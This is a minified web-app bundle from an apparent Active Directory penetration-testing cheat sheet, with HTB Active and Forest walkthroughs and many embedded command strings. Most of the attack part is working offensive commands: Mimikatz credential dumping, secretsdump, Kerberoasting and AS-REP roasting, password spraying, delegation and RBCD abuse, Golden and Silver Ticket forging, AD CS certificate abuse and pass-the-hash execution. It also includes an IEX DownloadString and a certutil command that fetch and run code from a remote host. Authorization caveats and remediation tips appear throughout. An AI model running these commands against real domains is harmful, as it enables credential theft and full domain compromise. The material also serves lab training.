Checks"),e()(),n(58,"ul")(59,"li"),t(60,"Require Kerberos pre-authentication unless a documented exception exists."),e(),n(61,"li"),t(62,"Use unique, strong passwords for service accounts and review their privileges."),e(),n(63,"li"),t(64,"Restrict account-creation and group-management rights to approved administrators."),e(),n(65,"li"),t(66,"Audit domain ACL changes and replication-right assignments."),e(),n(67,"li"),t(68,"Alert on unexpected account or group changes and unusual directory replication."),e()()()(),m()),s&2){let o=p();a(12),i("command",o.forestRecon),a(10),i("command",o.forestLdapAudit),a(),i("queryParams",u(6,W)),a(20),i("command",o.forestDirectoryReview),a(),i("queryParams",u(7,z)),a(2),i("queryParams",u(8,B))}}function pe(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"HTB Active: SYSVOL & Kerberos Audit Walkthrough"),e(),n(3,"p",11),t(4," Active is a retired Windows domain-controller lab. The key lesson is that anonymously readable SYSVOL replication data can expose legacy Group Policy Preferences, while a service account can provide a Kerberos attack surface. Commands below are limited to service discovery, share listing and policy inventory; use them only against the authorized HTB target. "),e(),n(5,"mat-accordion",14)(6,"mat-expansion-panel")(7,"mat-expansion-panel-header")(8,"mat-panel-title"),t(9,"01. Port Scan & SMB Share Discovery"),e()(),n(10,"p"),t(11," Confirm the domain-controller services and check whether SMB permits an anonymous session. In this machine, the notable share is "),n(12,"code"),t(13,"Replication"),e(),t(14,". "),e(),r(15,"app-terminal",12),e(),n(16,"mat-expansion-panel")(17,"mat-expansion-panel-header")(18,"mat-panel-title"),t(19,"02. Review the SYSVOL Exposure"),e()(),n(20,"p"),t(21," The share contains replicated Group Policy data, including a legacy Group Policy Preferences XML file. A "),n(22,"code"),t(23,"cpassword"),e(),t(24," value in a preference file is a known insecure storage pattern, not a secure secret. Do not copy, decrypt or reuse the value; report the exposure and treat affected credentials as compromised. "),e(),r(25,"app-terminal",12),n(26,"a",17),t(27," Review domain shares and SYSVOL "),e()(),n(28,"mat-expansion-panel")(29,"mat-expansion-panel-header")(30,"mat-panel-title"),t(31,"03. Assess the Service-Account Kerberos Risk"),e()(),n(32,"p"),t(33," The lab's exposed preference is associated with the "),n(34,"code"),t(35,"svc_tgs"),e(),t(36," service account. Assess whether service accounts have registered SPNs and whether their passwords meet current policy. Keep the review to directory metadata and authorized configuration checks; this guide does not request or crack Kerberos tickets. "),e(),n(37,"a",17),t(38," Review SPN enumeration guidance "),e(),n(39,"a",17),t(40," Review Kerberos security checks "),e()(),n(41,"mat-expansion-panel")(42,"mat-expansion-panel-header")(43,"mat-panel-title"),t(44,"04. Validate Impact & Remediate"),e()(),n(45,"p"),t(46," The intended lab chain demonstrates how legacy GPP secret exposure and weak service-account credentials can lead to domain compromise. Do not use recovered secrets to access systems or extract domain credentials. In an assessment, document the affected policy and account, then ask the domain owner to rotate credentials and remove the insecure preference. "),e(),n(47,"ul")(48,"li"),t(49,"Remove passwords from Group Policy Preferences and rotate any exposed credentials."),e(),n(50,"li"),t(51,"Limit SYSVOL access to the domain's intended authenticated principals."),e(),n(52,"li"),t(53,"Use long, unique, managed service-account credentials."),e(),n(54,"li"),t(55,"Monitor anonymous SMB access, SYSVOL reads and unusual service-account authentication."),e()()()(),m()),s&2){let o=p();a(15),i("command",o.activeRecon),a(10),i("command",o.activeGpoAudit),a(),i("queryParams",u(5,F)),a(11),i("queryParams",u(6,K)),a(2),i("queryParams",u(7,W))}}function de(s,l){if(s&1&&(d(0),n(1,"h2"),t(2,"Full AD Compromise from Linux"),e(),n(3,"p"),t(4," Structured Active Directory assessment workflow using Kali Linux. Perform these steps only in systems you are authorized to test. "),e(),n(5,"mat-accordion",14)(6,"mat-expansion-panel")(7,"mat-expansion-panel-header")(8,"mat-panel-title"),t(9,"Phase 0 \u2013 Initial Scan"),e()(),r(10,"app-terminal",12),e(),n(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),t(14,"Phase 1 \u2013 Enumeration Without Credentials"),e()(),r(15,"app-terminal",12),e(),n(16,"mat-expansion-panel")(17,"mat-expansion-panel-header")(18,"mat-panel-title"),t(19,"Phase 2 \u2013 Enumeration With Credentials"),e()(),r(20,"app-terminal",12),e(),n(21,"mat-expansion-panel")(22,"mat-expansion-panel-header")(23,"mat-panel-title"),t(24,"Phase 3 \u2013 Lateral Movement"),e()(),r(25,"app-terminal",12),e(),n(26,"mat-expansion-panel")(27,"mat-expansion-panel-header")(28,"mat-panel-title"),t(29,"Phase 4 \u2013 Credential Dumping"),e()(),r(30,"app-terminal",12),e()(),m()),s&2){let o=p();a(10),i("command",o.linuxAdInitialScan),a(5),i("command",o.linuxAdNoCredentials),a(5),i("command",o.linuxAdWithCredentials),a(5),i("command",o.linuxAdLateralMovement),a(5),i("command",o.linuxAdCredentialDumping)}}var G=class s{selectedService="full-ad-compromise-linux";sections=[{id:"full-ad-compromise-linux",label:"Kali Single-Host Flow",group:"AD Flow",important:!0},{id:"ad-flow",label:"Windows Pivot Flow",group:"AD Flow",important:!0},{id:"windows",label:"Windows Commands",group:"Enumeration"},{id:"powerview",label:"PowerView",group:"Enumeration"},{id:"manual",label:"Manual Enumeration",group:"Enumeration"},{id:"spn",label:"SPN Enumeration",group:"Enumeration"},{id:"acl",label:"Object Permissions",group:"Enumeration"},{id:"shares",label:"Domain Shares",group:"Enumeration"},{id:"bloodhound",label:"BloodHound",group:"Enumeration"},{id:"credentials",label:"Credential Access",group:"Attacking"},{id:"kerberos",label:"Kerberos Attacks",group:"Attacking"},{id:"passwords",label:"Password Attacks",group:"Attacking"},{id:"adcs",label:"AD Certificate Services (ADCS)",group:"Attacking"},{id:"dcom",label:"DCOM Lateral Movement",group:"Attacking"},{id:"gpo-abuse",label:"GPO Abuse",group:"Attacking"},{id:"post-exploitation-checklist",label:"Post-Compromise Checklist",group:"Post-Exploitation"},{id:"compromise",label:"Domain Compromise",group:"Attacking"},{id:"ad-example-three-host",label:"Three-Host Domain Chain",group:"Examples",important:!0},{id:"forest-writeup",label:"HTB Forest",group:"Examples",important:!0},{id:"active-writeup",label:"HTB Active",group:"Examples",important:!0},{id:"planned-privesc",label:"Privilege Escalation",group:"Coming later",disabled:!0}];selectedFlowPhase="";route=g(A);router=g(C);destroyRef=g(y);ngOnInit(){this.route.queryParamMap.pipe(T(this.destroyRef)).subscribe(l=>{let o=l.get("service");o&&this.sections.some(c=>c.id===o&&!c.disabled)&&(this.selectedService=o),this.selectedFlowPhase=l.get("phase")??""})}selectService(l){this.selectedService=l,this.router.navigate([],{relativeTo:this.route,queryParams:{service:l},replaceUrl:!0})}clearService(){this.selectedService="full-ad-compromise-linux"}windowsUsers=`
# List users in the domain
net user /domain

# Get information about a specific domain user
net user <username> /domain
`;windowsGroups=`
# List domain groups
net group /domain

# Enumerate a specific domain group
net group "Sales Department" /domain
`;powerViewImport=`
# Import PowerView
Import-Module .\\PowerView.ps1

# Get basic domain information
Get-NetDomain
`;powerViewUsers=`
# List domain users
Get-NetUser

# Display common names
Get-NetUser | Select-Object cn

# Display password and logon information
Get-NetUser | Select-Object cn,pwdlastset,lastlogon
`;powerViewGroups=`
# List domain groups
Get-NetGroup

# Display group names
Get-NetGroup | Select-Object cn

# Enumerate members of a specific group
Get-NetGroup "Sales Department" | Select-Object member
`;manualComputers=`
# Enumerate domain computers
Get-NetComputer

# Identify operating systems and hostnames
Get-NetComputer | Select-Object operatingsystem,dnshostname

# Include operating system versions
Get-NetComputer | Select-Object operatingsystem,dnshostname,operatingsystemversion
`;manualLocalAdmin=`
# Find systems where the current user has local admin access
Find-LocalAdminAccess
`;manualSessions=`
# Query sessions on a named domain computer such as files04
Get-NetSession -ComputerName <name> -Verbose

# Example: query files04
Get-NetSession -ComputerName files04 -Verbose

# List logged-on users with PsLoggedOn
.\\PsLoggedon.exe \\\\<name>

# Example: query files04
.\\PsLoggedon.exe \\\\files04
`;spnSetspn=`
# List SPNs registered to a user
setspn -L <user>

# Example: inspect the iis_service account
setspn -L iis_service
`;spnPowerView=`
# Find domain users with registered SPNs
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
`;spnDns=`
# Perform a reverse DNS lookup
nslookup.exe <IP>
`;aclRights=`
# GenericAll: Full control over the object
# GenericWrite: Modify object attributes
# WriteOwner: Change the object's owner
# WriteDACL: Modify the object's access control list
# AllExtendedRights: Inspect the specific extended rights
# ForceChangePassword: Reset a user's password
# Self: Perform permitted self-membership or attribute changes
`;aclEnumeration=`
# Enumerate permissions on a user object
Get-ObjectAcl -Identity <user>

  # Example: inspect the stephanie user object
Get-ObjectAcl -Identity stephanie

# Convert a SID to a name
Convert-SidToName <ObjectSID>
`;aclGenericAll=`
# Find GenericAll permissions on a group
Get-ObjectAcl -Identity "Management Department" |
  Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} |
  Select-Object SecurityIdentifier,ActiveDirectoryRights
`;aclGroupMembership=`
# Add a user to a domain group
net group "Management Department" stephanie /add /domain

# Verify group membership
Get-NetGroup "Management Department" | Select-Object member

# Remove the user from the group
net group "Management Department" stephanie /delete /domain
`;aclAbuseWorkflow=String.raw`# Assess ACL paths identified by BloodHound or Get-ObjectAcl.
# Use only with an explicitly authorized lab account and object.

# GenericAll / ForceChangePassword: reset a test user's password
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' set password <TARGET_USER> '<NEW_TEST_PASSWORD>'

# WriteDACL: a principal can grant an additional object right
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dacl "<TARGET_GROUP>" <USER> GenericAll

# WriteOwner: set the owner, then review whether an ACL change is permitted
Set-DomainObjectOwner -Identity <TARGET_OBJECT> -OwnerIdentity <USER>
Add-DomainObjectAcl -TargetIdentity <TARGET_OBJECT> -PrincipalIdentity <USER> -Rights All

# Verify the resulting ACL and group membership, then restore the original
# state when the lab or engagement plan requires cleanup.

# GPO review: identify who can edit/link the policy and which OUs it affects.
# Do not alter production policy or deploy scripts outside the approved scope.
`;sharesEnumeration=`
# Discover domain shares
Find-DomainShare

# Check which shares are accessible
Find-DomainShare -CheckShareAccess
`;sharesAccess=`
# List the contents of a SYSVOL path
Get-ChildItem \\\\dc1.corp.com\\sysvol\\corp.com\\
`;sharesGpp=`
# Decrypt a Group Policy Preferences password hash
gpp-decrypt <password>
`;bloodhoundOverview=`
# SharpHound collects Active Directory relationship data.
# BloodHound visualizes relationships and potential attack paths.

# Useful analysis goals:
# - Shortest path to Domain Admin
# - Misconfigured object permissions (ACLs)
# - Local administrator relationships
# - Session-based attack paths
# - Kerberoastable and AS-REP roastable users
`;sharpHoundDownload=`
# Download and load the PowerShell collector
IEX (New-Object Net.WebClient).DownloadString(
  'http://<IP>/SharpHound.ps1'
)

# Alternative: download the executable using certutil
certutil -urlcache -f http://<IP>/SharpHound.exe SharpHound.exe

# Alternative: download a file using PowerShell
Invoke-WebRequest -Uri http://<IP>/SharpHound.exe \`
  -OutFile SharpHound.exe
`;sharpHoundCollection=`
# Collect supported data using SharpHound
.\\SharpHound.exe -c All

# Save the output to a specific directory
.\\SharpHound.exe -c All --outputdirectory C:\\Temp

# Specify the target domain
.\\SharpHound.exe -c All -d resourced.local
`;sharpHoundPowerShell=`
# Import the PowerShell collector
Import-Module .\\SharpHound.ps1

# Review available parameters
Get-Help Invoke-BloodHound

# Collect data and specify the output directory
Invoke-BloodHound -CollectionMethod All \`
  -OutputDirectory C:\\Users\\user\\Desktop \`
  -OutputPrefix "domain audit"
`;bloodhoundKali=`
# Start the Neo4j database service
sudo neo4j start

# Launch BloodHound
bloodhound
`;bloodhoundTransfer=`
# From an Evil-WinRM session, download the collected ZIP
download 20240504120000_BloodHound.zip
`;bloodhoundQueries=`
# Useful BloodHound analysis goals

# Shortest Path to Domain Admin
# Find Local Admin Rights
# Find Kerberoastable Users
# Find AS-REP Roastable Users
# Find Sessions (Logged-on Users)
`;attackCredentialOverview=`
# Identify the current security context
whoami
whoami /all

# Inspect interactive sessions
query user
qwinsta

# Inspect Kerberos tickets
klist

# Credential-access assessment checklist
# - Current user privileges
# - Local administrator or SYSTEM access
# - Logged-on privileged accounts
# - Accessible credential stores
# - Windows security protections
`;attackLsass=`
# Mimikatz: credential material in LSASS
# Use only in an authorized lab with appropriate privileges.

.\\mimikatz.exe

# Within the Mimikatz console
privilege::debug
sekurlsa::logonpasswords
sekurlsa::msv
sekurlsa::tickets
sekurlsa::ekeys

# Results depend on Windows protections, logon state
# and the privileges of the current process.
`;attackCachedCredentials=`
# In an elevated Mimikatz console, inspect cached domain logons
lsadump::cache

# DCC2 / MS Cache v2 is not an NTLM hash.
# Offline password auditing with Hashcat:
hashcat -m 2100 hashes.txt /path/to/wordlist.txt

# John the Ripper:
john --format=mscash2 hashes.txt
`;attackSam=`
# Save local registry hives (requires appropriate privileges)
reg save HKLM\\SAM C:\\Temp\\SAM
reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM

# Analyze the exported hives on Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# SAM contains local account hashes, not all domain hashes.
`;attackLsaSecrets=`
# In a Mimikatz console, inspect LSA secrets
lsadump::secrets

# Inspect local SAM hashes in the same console
lsadump::sam

# LSA secrets may contain service-related or machine-account
# material depending on the system configuration.
`;attackCredentialManager=`
# Enumerate credentials visible to the current user
cmdkey /list

# Inspect current Kerberos tickets
klist

# Mimikatz commands for an authorized lab
sekurlsa::credman
vault::cred

# Results depend on Windows version, logon session
# and the current security context.
`;attackDpapi=`
# In a Mimikatz console, inspect DPAPI material in memory
sekurlsa::dpapi

# DPAPI can protect browser data, application secrets
# and Credential Manager data.
#
# Recovering a master key does not automatically decrypt
# every protected file. Additional key material may be needed.
`;attackNtds=`
# Assess domain-controller credential exposure.
# Requires valid authentication and appropriate privileges.

# Remote assessment of a single account
impacket-secretsdump -just-dc-user <username> <domain>/<user>@<dc-ip>

# Use a lab account and the actual domain-controller address.
# Ordinary domain-user credentials are not sufficient by themselves.
`;attackAsrep=String.raw`# AS-REP Roasting: accounts with DONT_REQ_PREAUTH only
# Use only in an authorized lab; offline cracking does not contact the DC.

# Windows: enumerate accounts with PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# Windows: request hashes with Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Windows: target one known account
Rubeus.exe asreproast /user:<USER> /domain:<DOMAIN> /dc:<DC_FQDN> /nowrap /outfile:asrep.txt

# Kali: request hashes without credentials (requires a username list)
impacket-GetNPUsers <DOMAIN>/ -dc-ip {{TARGET_IP}} -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt

# Kali: request for an authenticated account
impacket-GetNPUsers <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}} -request -format hashcat -outputfile asrep.txt

# Offline audit: Hashcat mode 18200 is Kerberos 5 AS-REP etype 23
hashcat -m 18200 asrep.txt /path/to/wordlist.txt
hashcat -m 18200 asrep.txt --show

# Targeted lab demonstration: requires write rights on the user object.
# XOR toggles the flag; run a second time to restore its previous state.
Set-DomainObject -Identity <USER> -XOR @{useraccountcontrol=4194304} -Verbose
`;attackKerberoast=String.raw`# Kerberoasting: request TGS material for accounts with SPNs
# Request tickets only within the approved scope; crack them offline.

# Windows: enumerate SPN accounts with PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# Windows: export hashes from PowerView for offline review
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Windows: collect hashes with Rubeus
Rubeus.exe kerberoast /nowrap /outfile:kerberoast.txt
Rubeus.exe kerberoast /user:<USER> /nowrap /outfile:kerberoast.txt

# Kali: request TGS hashes with Impacket and authorized credentials
impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}} -request -outputfile kerberoast.txt

# Offline audit: mode 13100 is etype 23; mode 19700 is etype 17; mode 19600 is etype 18
hashcat -m 13100 kerberoast.txt /path/to/wordlist.txt
hashcat -m 13100 kerberoast.txt --show

# Prioritize weak service-account passwords and excessive privileges.
# Ticket encryption depends on the account and domain configuration.
`;attackKerbrute=String.raw`# Kerbrute: username enumeration and one-password assessment
# Confirm authorization, lockout policy, scope and attempt limits first.
# Stop on lockout indicators; do not spray production accounts.

# Enumerate candidate usernames against the domain controller
kerbrute userenum users.txt --dc {{TARGET_IP}} -d <DOMAIN>

# Controlled lab only: test one approved password against an approved user list
kerbrute passwordspray users.txt '<APPROVED_LAB_PASSWORD>' --dc {{TARGET_IP}} -d <DOMAIN>

# Review authentication events and lockout status after the test.
`;attackDelegation=String.raw`# Delegation assessment: identify configured delegation and its scope
# Validate findings only with approved lab accounts and systems.

# Windows: enumerate unconstrained delegation on computers
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# Windows: find users and computers trusted for protocol transition
Get-DomainUser -TrustedToAuth | Select-Object samaccountname
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname

# Windows: inspect allowed-to-delegate SPNs
Get-DomainUser -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties samaccountname,msds-allowedtodelegateto
Get-DomainComputer -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties dnshostname,msds-allowedtodelegateto

# Unconstrained delegation: monitor only in a disposable lab session
Rubeus.exe monitor /interval:5 /nowrap
# Optional controlled coercion test, only against authorized lab hosts
SpoolSample.exe <DC_FQDN> <LAB_HOST_FQDN>

# Constrained delegation: request a ticket only for an allowed SPN
Rubeus.exe s4u /user:<SERVICE_ACCOUNT> /rc4:<SERVICE_NTLM_HASH> /impersonateuser:<AUTHORIZED_TEST_USER> /msdsspn:<ALLOWED_SPN> /ptt

# Kali: request a constrained-delegation service ticket with Impacket
impacket-getST -spn <ALLOWED_SPN> -impersonate <AUTHORIZED_TEST_USER> <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}}

# Kali: summarize delegation using Impacket
impacket-findDelegation <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}}

# User-based unconstrained delegation: lab-only overview
# Requires a delegated test account, approved DNS/SPN changes and a controlled listener.
python dnstool.py -u <DOMAIN>/<USER> -p '<PASSWORD>' -r <LAB_HOST_FQDN> -d {{LOCAL_IP}} --action add {{TARGET_IP}}
python addspn.py -u <DOMAIN>/<USER> -p '<PASSWORD>' --target-type samname -t <DELEGATED_USER> -s CIFS/<LAB_HOST_FQDN> <DC_FQDN>
sudo python krbrelayx.py -hashes :<DELEGATED_USER_NTLM_HASH>

# Trigger only an approved lab authentication and monitor for tickets
Rubeus.exe monitor /interval:5 /nowrap
SpoolSample.exe <AUTHORIZED_LAB_HOST> <LAB_HOST_FQDN>

# Review delegated SPNs, account privileges and relevant event logs.
# Unconstrained delegation can expose cached tickets; do not export them outside the lab.
`;attackRbcd=String.raw`# Resource-Based Constrained Delegation (RBCD)
# Requirement: authorized write rights over the target computer object's RBCD attribute.
# Use a disposable lab account/computer and remove the ACL change after testing.

# Windows: locate computer-object permissions with PowerView/BloodHound
Get-DomainComputer -Properties samaccountname,msds-allowedtoactonbehalfofotheridentity
Get-ObjectAcl -Identity <TARGET_COMPUTER> -ResolveGUIDs

# Kali: add a lab computer account if the domain policy permits it
impacket-addcomputer <DOMAIN>/<USER>:'<PASSWORD>' -computer-name '<LAB_COMPUTER>$' -computer-pass '<LAB_MACHINE_PASSWORD>' -dc-host <DC_FQDN> -dc-ip {{TARGET_IP}}

# Grant the lab computer delegation rights on the target (authorized lab only)
impacket-rbcd -delegate-from '<LAB_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action write <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}}

# Request a service ticket for a lab service
impacket-getST -spn cifs/<TARGET_FQDN> -impersonate <AUTHORIZED_TEST_USER> <DOMAIN>/'<LAB_COMPUTER>$':'<LAB_MACHINE_PASSWORD>' -dc-ip {{TARGET_IP}}

# Use the ticket only against the authorized lab service
export KRB5CCNAME=./<AUTHORIZED_TEST_USER>.ccache
impacket-psexec -k -no-pass <TARGET_FQDN>

# Cleanup: remove the delegation entry and disposable computer account
impacket-rbcd -delegate-from '<LAB_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action remove <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}}
impacket-addcomputer <DOMAIN>/<USER>:'<PASSWORD>' -computer-name '<LAB_COMPUTER>$' -delete -dc-ip {{TARGET_IP}}
`;attackTicketEnumeration=`
# List tickets in the current Windows logon session
klist

# Mimikatz: inspect tickets in LSASS
sekurlsa::tickets

# Rubeus: enumerate ticket metadata
.\\Rubeus.exe triage

# Exporting or accessing tickets requires appropriate access.
# Protect exported .kirbi files as sensitive credentials.
`;attackPassTheTicket=`
# Rubeus ticket operations require an authorized lab
# and a valid ticket belonging to the test environment.

# Create an isolated logon session for a controlled test
Rubeus.exe createnetonly /program:cmd.exe /show

# Inspect tickets in the current session
klist
Rubeus.exe triage

# Import a lab ticket into the selected session
.\\Rubeus.exe ptt /ticket:<ticket-file.kirbi>

# Verify the ticket cache and access only the matching authorized service
klist

# Linux: convert a lab .kirbi ticket for Impacket, if needed
impacket-ticketConverter <TICKET_FILE>.kirbi <TICKET_FILE>.ccache
export KRB5CCNAME=./<TICKET_FILE>.ccache
impacket-smbclient -k -no-pass <TARGET_FQDN>

# A ticket does not automatically grant access to every host:
# the service, identity, validity and permissions must match.
`;attackGoldenTicket=String.raw`# Golden Ticket: high-impact domain recovery / lab demonstration only
# Requires the KRBTGT key, domain SID and an authorized domain test environment.
# Treat generated tickets and keys as credentials; rotate KRBTGT twice after exposure.

# Windows: forge and inject a lab ticket with Mimikatz
mimikatz.exe
kerberos::golden /domain:<DOMAIN> /user:<AUTHORIZED_TEST_USER> /sid:<DOMAIN_SID> /rc4:<KRBTGT_NTLM_HASH> /ptt

# Kali: create a ticket file with Impacket
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <AUTHORIZED_TEST_USER>
export KRB5CCNAME=./<AUTHORIZED_TEST_USER>.ccache
impacket-psexec -k -no-pass <DC_FQDN>

# Verify ticket metadata without using it outside the approved scope
klist

# Detection/remediation: audit ticket lifetimes and unusual identities;
# rotate the KRBTGT secret twice with replication convergence between resets.
`;attackSilverTicket=String.raw`# Silver Ticket: service-specific ticket validation in an authorized lab
# Requires the service/machine account key, domain SID, target SPN and test identity.
# Unlike a Golden Ticket, scope is limited to the target service.

# Kali: generate a service ticket for a lab SPN
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn cifs/<TARGET_FQDN> <AUTHORIZED_TEST_USER>

# Export the ticket and verify its metadata; use only against the authorized service
export KRB5CCNAME=./<AUTHORIZED_TEST_USER>.ccache
klist
impacket-smbclient -k -no-pass <TARGET_FQDN>

# Windows tool alternative: build a test ticket with Mimikatz
mimikatz.exe
kerberos::golden /domain:<DOMAIN> /user:<AUTHORIZED_TEST_USER> /sid:<DOMAIN_SID> /rc4:<SERVICE_NTLM_HASH> /target:<TARGET_FQDN> /service:cifs /ptt

# Detection: correlate service access with DC ticket-request logs and inspect unusual PACs.
# Remediation: rotate the compromised service/machine account secret and review access.
`;attackPasswordPolicy=`
# Inspect domain password and lockout policy
net accounts /domain

# Inspect local account policy
net accounts

# Review:
# - Lockout threshold
# - Lockout duration
# - Observation window
# - Password length and complexity
#
# Confirm the approved testing limits before authentication tests.
`;attackCredentialValidation=`
# Resolve the current domain, PDC and base DN for an LDAP test.
# This snippet does not bind or validate credentials.

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$pdc = $domainObj.PdcRoleOwner.Name
$dn = "DC=" + $domainObj.Name.Replace(".", ",DC=")
$path = "LDAP://$pdc/$dn"

# Perform any credential bind separately with authorized lab credentials.
# Do not hardcode passwords in scripts or command history.
`;attackPasswordSpray=`
# Password spraying tests one approved candidate password
# against a controlled set of test accounts.
#
# Before testing:
# 1. Obtain explicit authorization.
# 2. Review lockout policy and approved attempt limits.
# 3. Use designated lab accounts.
# 4. Monitor authentication logs.
#
# Do not run a spray against an unspecified or production domain.
`;attackSmbValidation=`
# Validate a known lab credential against an authorized SMB host
# with NetExec (success does not necessarily mean admin access).

nxc smb <target-ip> -d <domain> -u <username> -p '<lab-password>'

# Enumerate shares when authorized
nxc smb <target-ip> -d <domain> -u <username> -p '<lab-password>' --shares

# Review authentication status, privileges and share permissions.
`;adcsOverview=String.raw`# AD Certificate Services (AD CS) issues certificates used for
# authentication by domain users and computers.
# Misconfigured templates or permissions can expose identity paths.
# Assess only the authorized domain and avoid retaining private keys.

# Review certificate authorities, templates, permissions and findings.
# Prioritize ESC findings only after validating the affected configuration.
`;adcsEnumeration=String.raw`# Enumerate certificate authorities and vulnerable templates
certipy-ad find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable

# Review CA name, target server, template name, enrollment rights,
# subject/SAN settings, and template owner/write permissions.
# Common findings to assess include ESC1, ESC2, ESC3, ESC4 and ESC8.
`;adcsTemplateReview=String.raw`# ESC4 assessment: a principal may have dangerous rights on a template.
# Save the existing template configuration before any approved lab change.
certipy-ad template -u <USER>@<DOMAIN> -p '<PASSWORD>' -template <TEMPLATE> -dc-ip <DC_IP> -save-configuration template-backup.json

# Template modification changes Active Directory configuration.
# Only perform a controlled demonstration when specifically authorized.
certipy-ad template -u <USER>@<DOMAIN> -p '<PASSWORD>' -template <TEMPLATE> -dc-ip <DC_IP> -write-default-configuration -force

# Restore the saved configuration after the test using the supported
# Certipy template restore workflow for the installed version.
`;adcsCertificateRequest=String.raw`# Request a certificate from the identified CA and template
certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <TEMPLATE>

# If the template permits an alternate UPN (for an approved lab test):
certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template <TEMPLATE> -upn <TEST_USER>@<DOMAIN>

# Modern environments may require a SID extension. Determine the correct
# test account SID before requesting a replacement certificate.
impacket-lookupsid <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP>
certipy-ad req -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -target <DC_FQDN> -target-ip <DC_IP> -ca <CA_NAME> -template <TEMPLATE> -upn <TEST_USER>@<DOMAIN> -sid <TEST_USER_SID>
`;adcsCertificateAuth=String.raw`# Authenticate with the certificate produced by an approved lab request
certipy-ad auth -pfx <CERTIFICATE>.pfx -dc-ip <DC_IP>

# Review certificate identity and validity before using the result.
certipy-ad cert -pfx <CERTIFICATE>.pfx

# Troubleshooting: specify -target-ip <DC_IP> for RPC reachability issues;
# if the KDC reports a SID mismatch, request a certificate with the correct SID.
# Treat PFX files, tickets and returned hashes as credentials.
`;attackDcsyncRequirements=`
# DCSync abuses directory replication permissions.
# It does not require an interactive login to the DC, but
# the account must have the relevant replication rights.

# Review effective permissions for:
# - Replicating Directory Changes
# - Replicating Directory Changes All
# - Replicating Directory Changes In Filtered Set (where relevant)

# Investigate unexpected principals with replication privileges.
`;attackDcsyncDetection=`
# Detection and validation checklist

# - Review directory replication events and domain-controller logs.
# - Investigate replication requests from unusual hosts/accounts.
# - Audit privileged group membership and delegated ACLs.
# - Remove unnecessary replication rights.
# - Rotate exposed credentials and assess krbtgt remediation
#   with the domain administrator.
#
# Event availability depends on audit policy and Windows version.
`;attackPostCompromise=`
# Post-assessment checklist

1. Record the account and credential type discovered.
2. Identify the exact privileges and affected systems.
3. Avoid using recovered credentials beyond the approved scope.
4. Protect evidence and redact secrets in reports.
5. Notify the system owner of critical credential exposure.
6. Recommend credential rotation and least-privilege remediation.
7. Remove temporary files and tools according to the engagement plan.
`;postExploitSituationalAwareness=`
# Establish the current identity and machine context
whoami /all
hostname
systeminfo
ipconfig /all
route print
echo %USERDOMAIN%
nltest /dsgetdc:<DOMAIN>

# Map domain users, privileged groups and current sessions
net user /domain
net group "Domain Admins" /domain
net group "Domain Computers" /domain
query user
qwinsta
klist
`;postExploitCredentialRecovery=`
# Remote LSASS collection requires authorized local administrator rights
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M lsassy

# Save local registry hives only from an elevated session
reg save HKLM\\SAM C:\\Temp\\SAM
reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM

# Analyze collected local hives on Kali
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Treat recovered hashes, tickets and passwords as sensitive evidence.
# Do not store credentials in source code or outside the engagement workspace.
`;postExploitCredentialRoutes=`
# Password: validate access only against the approved target list
nxc smb <TARGETS> -u <USER> -p '<PASSWORD>' --continue-on-success
nxc winrm <TARGETS> -u <USER> -p '<PASSWORD>'

# NTLM hash: use only where Pass-the-Hash is in scope
nxc smb <TARGETS> -u <USER> -H <NTLM_HASH> --continue-on-success
nxc winrm <TARGETS> -u <USER> -H <NTLM_HASH>

# Remote execution requires sufficient administrative rights
impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET>
impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET>

# Kerberos ticket: verify the identity, service and expiry with klist;
# continue with the Kerberos / Pass-the-Ticket section, not password spraying.
`;postExploitAdminGroupAccess=`
# Optional: only if explicitly authorized to modify local group membership.
# Run from an elevated Windows session; this changes the target host.
net localgroup Administrators <USER> /add

# Verify the resulting membership
net localgroup Administrators

# From Kali, reconnect using the approved account
